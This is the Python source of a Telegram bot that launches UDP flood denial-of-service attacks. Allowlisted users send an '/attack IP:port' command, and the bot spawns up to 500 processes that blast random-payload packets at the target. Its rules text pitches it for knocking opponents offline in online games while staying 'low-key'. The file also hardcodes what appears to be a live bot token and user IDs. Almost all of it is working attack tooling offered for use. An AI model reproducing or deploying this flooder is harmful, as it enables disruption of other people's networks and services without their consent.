import telebot
import socket
import multiprocessing
import os
import random
import time
import subprocess
import sys
import datetime
import logging
import socket

# 🎛️ Function to install required packages
def install_requirements():
    # Check if requirements.txt file exists
    try:
        with open('requirements.txt', 'r') as f:
            pass
    except FileNotFoundError:
        print("Error: requirements.txt file not found!")
        return

    # Install packages from requirements.txt
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
        print("Installing packages from requirements.txt...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install packages from requirements.txt ({e})")

    # Install pyTelegramBotAPI
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyTelegramBotAPI'])
        print("Installing pyTelegramBotAPI...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install pyTelegramBotAPI ({e})")

# Call the function to install requirements
install_requirements()

# 🎛️ Telegram API token (replace with your actual token)
TOKEN = '7980429494:AAHiN2vOjOyGbgEVUl1bZIEGpiJzR34_xd0'
bot = telebot.TeleBot(TOKEN, threaded=False)

# 🛡️ List of authorized user IDs (replace with actual IDs)
AUTHORIZED_USERS = [809680839, 6740684755 , 6090084901]

# 🌐 Global dictionary to keep track of user attacks
user_attacks = {}

# ⏳ Variable to track bot start time for uptime
bot_start_time = datetime.datetime.now()

# 📜 Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 🛠️ Function to send UDP packets
def udp_flood(target_ip, target_port, stop_flag):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
    while not stop_flag.is_set():
        try:
            packet_size = random.randint(64, 1469)  # Random packet size
            data = os.urandom(packet_size)  # Generate random data
            for _ in range(20000):  # Maximize impact by sending multiple packets
                sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            logging.error(f"Error sending packets: {e}")
            break  # Exit loop on any socket error

# 🚀 Function to start a UDP flood attack
def start_udp_flood(user_id, target_ip, target_port):
    stop_flag = multiprocessing.Event()
    processes = []

    # Allow up to 500 CPU threads for maximum performance
    for _ in range(min(500, multiprocessing.cpu_count())):
        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
        process.start()
        processes.append(process)

    # Store processes and stop flag for the user
    user_attacks[user_id] = (processes, stop_flag)
    bot.send_message(user_id, f"☢️𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target_ip}\n𝐏𝐨𝐫𝐭: :{target_port} \n𝐌𝐞𝐭𝐡𝐨𝐝: @kksharma_yt💀")

# ✋ Function to stop all attacks for a specific user
def stop_attack(user_id):
    if user_id in user_attacks:
        processes, stop_flag = user_attacks[user_id]
        stop_flag.set()  # 🛑 Stop the attack

        # 🕒 Wait for all processes to finish
        for process in processes:
            process.join()

        del user_attacks[user_id]
        bot.send_message(user_id, "🔴 All Attack stopped.")
    else:
        bot.send_message(user_id, "❌ No active attack found >ᴗ<")

# 🕰️ Function to calculate bot uptime ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷
def get_uptime():
    uptime = datetime.datetime.now() - bot_start_time
    return str(uptime).split('.')[0]  # Format uptime to exclude microseconds ˏˋ°•*⁀➷ˏˋ°•*⁀➷

# 📜 Function to log commands and actions
def log_command(user_id, command):
    logging.info(f"User ID {user_id} executed command: {command}")

# 💬 Command handler for /start ☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    log_command(user_id, '/start')
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @kksharma_yt")
    else:
        welcome_message = (
            "🎮 **Welcome to the Ultimate Attack Bot!** 🚀\n\n"
            "Use /attack `<IP>:<port>` to start an attack, or /stop to halt your attack.\n\n"
            "📜 **Bot Rules - Keep It Cool!** 🌟\n"
            "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n"
            "2. Limit your kills! 🔫 Stay under 30-40 kills to keep it fair.\n"
            "3. Play smart! 🎮 Avoid reports and stay low-key.\n"
            "4. No mods allowed! 🚫 Using hacked files will get you banned.\n"
            "5. Be respectful! 🤝 Keep communication friendly and fun.\n"
            "6. Report issues! 🛡️ Message the owner for any problems.\n"
            "7. Always check your command before executing! ✅\n"
            "8. Do not attack without permission! ❌⚠️\n"
            "9. Be aware of the consequences of your actions! ⚖️\n"
            "10. Stay within the limits and play fair! 🤗\n"
            "💡 Follow the rules and let's enjoy gaming together! 🎉\n"
            "📞 Contact the owner on Instagram and Telegram: @kksharma_yt\n"
            "☠️ To see the Telegram Bot Command type: /help"
            "👤 To find your user ID type: /id"
        )
        bot.send_message(message.chat.id, welcome_message)

# 💬 Command handler for /attack ⋆.˚🦋༘⋆⋆.˚🦋༘⋆⋆.˚🦋༘⋆ 
@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    log_command(user_id, '/attack')
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @kksharma_yt")
        return

    # Parse target IP and port from the command ︵‿︵‿︵‿︵ ⋆.˚🦋༘⋆
    try:
        command = message.text.split()
        target = command[1].split(':')
        target_ip = target[0]
        target_port = int(target[1])
        start_udp_flood(user_id, target_ip, target_port)
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐟𝐨𝐫𝐦𝐚𝐭❗️ \n✅ 𝐔𝐬𝐚𝐠𝐞 :- /attack <IP>:<port>")
        
"""""
    Me             scammer 🏳️‍🌈
 ⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿ ︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵
"""""
# 💬 Command handler for /stop
@bot.message_handler(commands=['stop'])
def stop(message):
    user_id = message.from_user.id
    log_command(user_id, '/stop')
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @kksharma_yt")
        return

    stop_attack(user_id)

# 💬 Command handler for /id  
@bot.message_handler(commands=['id'])  # 👀 Handling the /id command ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
def show_id(message):
    user_id = message.from_user.id  # 🔍 Getting the user ID ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
    username = message.from_user.username  # 👥 Getting the user's username ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
    log_command(user_id, '/id')  # 👀 Logging the command ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆ ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆

    # 👤 Sending the message with the user ID and username
    bot.send_message(message.chat.id, f"👤 Your User ID is: {user_id}\n"
                                      f"👥 Your Username is: @{username}")

    # 👑 Printing the bot owner's username ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
    bot_owner = "kksharma_yt"  # 👑 The bot owner's username  ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
    bot.send_message(message.chat.id, f"🤖 This bot is owned by: @{bot_owner}")

# 💬 Command handler for /rules. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['rules'])
def rules(message):
    log_command(message.from_user.id, '/rules')
    rules_message = (
        "📜 **Bot Rules - Keep It Cool!** 🌟\n"
        "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n"
        "2. Limit your kills! 🔫 Stay under 30-40 kills to keep it fair.\n"
        "3. Play smart! 🎮 Avoid reports and stay low-key.\n"
        "4. No mods allowed! 🚫 Using hacked files will get you banned.\n"
        "5. Be respectful! 🤝 Keep communication friendly and fun.\n"
        "6. Report issues! 🛡️ Message the owner for any problems.\n"
        "7. Always check your command before executing! ✅\n"
        "8. Do not attack without permission! ❌⚠️\n"
        "9. Be aware of the consequences of your actions! ⚖️\n"
        "10. Stay within the limits and play fair! 🤗"
    )
    bot.send_message(message.chat.id, rules_message)

# 💬 Command handler for /owner. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['owner'])
def owner(message):
    log_command(message.from_user.id, '/owner')
    bot.send_message(message.chat.id, "📞 Contact the owner: @kksharma_yt")

# 💬 Command handler for /uptime. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['uptime'])
def uptime(message):
    log_command(message.from_user.id, '/uptime')
    bot.send_message(message.chat.id, f"⏱️ Bot Uptime: {get_uptime()}")

# 💬 Command handler for /ping. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['ping'])
@bot.message_handler(commands=['ping'])
def ping_command(message):
    user_id = message.from_user.id
    log_command(user_id, '/ping')

    bot.send_message(message.chat.id, "Checking your connection speed...")

    # Measure ping time     . ݁₊ ⊹ . ݁˖ . ݁        . ݁₊ ⊹ . ݁˖ . ݁         . ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
    start_time = time.time()
    try:
        # Use a simple DNS resolution to check responsiveness     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦. ݁₊ ⊹ . ݁˖ . ݁
        socket.gethostbyname('google.com')
        ping_time = (time.time() - start_time) * 1000  # Convert to milliseconds     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
        ping_response = (
            f"Ping: `{ping_time:.2f} ms` ⏱️\n"
            f"Your IP: `{get_user_ip(user_id)}` 📍\n"
            f"Your Username: `{message.from_user.username}` 👤\n"
        )
        bot.send_message(message.chat.id, ping_response)
    except socket.gaierror:
        bot.send_message(message.chat.id, "❌ Failed to ping! Check your connection.")

def get_user_ip(user_id):
    try:
        ip_address = requests.get('https://api.ipify.org/').text
        return ip_address
    except:
        return "IP Not Found 🤔"

# 💬 Command handler for /help           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
@bot.message_handler(commands=['help'])
def help_command(message):
    log_command(message.from_user.id, '/help')
    help_message = (
        "🤔 **Need Help?** 🤔\n"
        "Here are the available commands:\n"
        "🔹 **/start** - Start the bot 🔋\n"
        "💣 **/attack `<IP>:<port>`** - Launch a powerful attack 💥\n"
        "🛑 **/stop** - Stop the attack 🛑️\n"
        "👀 **/id** - Show your user ID 👤\n"
        "📚 **/rules** - View the bot rules 📖\n"
        "👑 **/owner** - Contact the owner 👑\n"
        "⏰ **/uptime** - Get bot uptime ⏱️\n"
        "📊 **/ping** - Check your connection ping 📈\n"
        "🤝 **/help** - Show this help message 🤝"
    )
    bot.send_message(message.chat.id, help_message)

#### DISCLAIMER ####              ✦•┈๑⋅⋯ ⋯⋅๑┈•✦                      ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
"""
**🚨 IMPORTANT: PLEASE READ CAREFULLY BEFORE USING THIS BOT 🚨**

This bot is owned and operated by @kksharma_yt on Telegram and kksharma_yt on Instagram, 🇮🇳. By using this bot, you acknowledge that you understand and agree to the following terms:

* **🔒 NO WARRANTIES**: This bot is provided "as is" and "as available", without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement.
* **🚫 LIMITATION OF LIABILITY**: The owner and operator of this bot, @kksharma_yt on Telegram and kksharma_yt on Instagram, shall not be liable for any damages or losses arising from the use of this bot, including but not limited to direct, indirect, incidental, punitive, and consequential damages, including loss of profits, data, or business interruption.
* **📚 COMPLIANCE WITH LAWS**: You are responsible for ensuring that your use of this bot complies with all applicable laws and regulations, including but not limited to laws related to intellectual property, data privacy, and cybersecurity.
* **📊 DATA COLLECTION**: This bot may collect and use data and information about your usage, including but not limited to your IP address, device information, and usage patterns, and you consent to such collection and use.
* **🤝 INDEMNIFICATION**: You agree to indemnify and hold harmless @kksharma_yt on Telegram and kksharma_yt on Instagram, and its affiliates, officers, agents, and employees, from and against any and all claims, damages, obligations, losses, liabilities, costs or debt, and expenses (including but not limited to attorney's fees) arising from or related to your use of this bot.
* **🌐 THIRD-PARTY LINKS**: This bot may contain links to third-party websites or services, and you acknowledge that @kksharma_yt on Telegram and kksharma_yt on Instagram is not responsible for the content, accuracy, or opinions expressed on such websites or services.
* **🔄 MODIFICATION AND DISCONTINUATION**: You agree that @kksharma_yt on Telegram and kksharma_yt on Instagram may modify or discontinue this bot at any time, without notice, and that you will not be entitled to any compensation or reimbursement for any losses or damages arising from such modification or discontinuation.
* **👧 AGE RESTRICTION**: You acknowledge that this bot is not intended for use by minors, and that you are at least 18 years old (or the age of majority in your jurisdiction) to use this bot.
* **🇮🇳 GOVERNING LAW**: You agree that this disclaimer and the terms and conditions of this bot will be governed by and construed in accordance with the laws of India, 🇮🇳, and that any disputes arising from or related to this bot will be resolved through binding arbitration in accordance with the rules of [Arbitration Association].
* **📝 ENTIRE AGREEMENT**: This disclaimer constitutes the entire agreement between you and @kksharma_yt on Telegram and kksharma_yt on Instagram regarding your use of this bot, and supersedes all prior or contemporaneous agreements or understandings.
* **👍 ACKNOWLEDGMENT**: By using this bot, you acknowledge that you have read, understood, and agree to be bound by these terms and conditions. If you do not agree to these terms and conditions, please do not use this bot.

**👋 THANK YOU FOR READING! 👋**
"""
# don't Change the " DISCLAIMER " ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
"""
███████▀▀▀░░░░░░░▀▀▀███████  
████▀░░░░░░░░░░░░░░░░░▀████  
███│░░░░░░░░░░░░░░░░░░░│███  
██▌│░░░░░░░░░░░░░░░░░░░│▐██  
██░└┐░░░░░░░░░░░░░░░░░┌┘░██  
██░░└┐░░░░░░░░░░░░░░░┌┘░░██  
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██  
██▌░│██████▌░░░▐██████│░▐██  
███░│▐███▀▀░░▄░░▀▀███▌│░███  
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██  
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██  
████▄─┘██▌░░░░░░░▐██└─▄████  
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████  
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████  
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████  
███████▄░░░░░░░░░░░▄███████  
██████████▄▄▄▄▄▄▄██████████  
███████████████████████████  
"""
# 🎮 Run the bot ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
if __name__ == "__main__":
    print(" 🎉🔥 Starting the Telegram bot...")  # Print statement for bot starting
    print(" ⏱️ Initializing bot components...")  # Print statement for initialization

    # Add a delay to allow the bot to initialize ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
    time.sleep(5)

    # Print a success message if the bot starts successfully ╰┈➤. ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
    print(" 🚀 Telegram bot started successfully!")  # ╰┈➤. Print statement for successful startup
    print(" 👍 Bot is now online and ready to Ddos_attack! ▰▱▰▱▰▱▰▱▰▱▰▱▰▱")

    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot encountered an error: {e}")
        print(" 🚨 Error: Bot encountered an error. Restarting in 5 seconds... ⏰")
        time.sleep(5)  # Wait before restarting ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
        print(" 🔁 Restarting the Telegram bot... 🔄")
        print(" 💻 Bot is now restarting. Please wait... ⏳")
        
